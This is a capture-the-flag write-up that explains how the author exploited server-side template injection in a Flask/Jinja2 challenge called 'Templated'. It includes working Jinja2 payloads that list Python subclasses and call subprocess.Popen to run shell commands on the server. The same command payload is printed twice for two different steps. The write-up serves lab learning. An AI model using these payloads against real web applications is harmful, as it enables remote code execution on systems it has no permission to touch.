...
Navigating to the site shows almost nothing except that it is powered by flask/jinja2. This is important and means its a possible SSTI. Also the challenge name is Templated so there isnt much to deduce.


![image](https://user-images.githubusercontent.com/105310322/192394466-88014553-c0ad-466d-93c1-df83281d23d1.png)


These 2 links gave me the info I needed to finish this challenge.
...
The parameter that we will inject our SSTI is the URL.

By putting ```{{ 7*7 }}``` after the URL we can confirm the SSTI since it equals 49.

![image](https://user-images.githubusercontent.com/105310322/192394876-fa772994-5417-46ee-9520-64f7115d1764.png)

Next we can try and leak some classes.

The line ```{{ dict.mro()[-1].__subclasses__() }}``` will output all of the classes that are being used by the webapp.

![image](https://user-images.githubusercontent.com/105310322/192395024-c7387417-609e-4ae1-bb4c-6e9de650f6ec.png)

It is alot so all I did was throw it into Visual Studio and format so each subclass was easier to read.

On line 414 we have ```subprocess.Popen``` this means we can call this function in our SSTI.
...
Inputting ```{{''.__class__.mro()[1].__subclasses__()[415]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}``` reveals that there is a flag.txt file in our immediate directory.

![image](https://user-images.githubusercontent.com/105310322/192395423-f2504d1c-916d-4e2a-949f-a8d91fd06be5.png)

Finally inputting ```{{''.__class__.mro()[1].__subclasses__()[415]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}``` will give us our flag!

![image](https://user-images.githubusercontent.com/105310322/192395546-361ffa86-f8cf-41cd-bcb9-2a6b6b7abdfe.png)
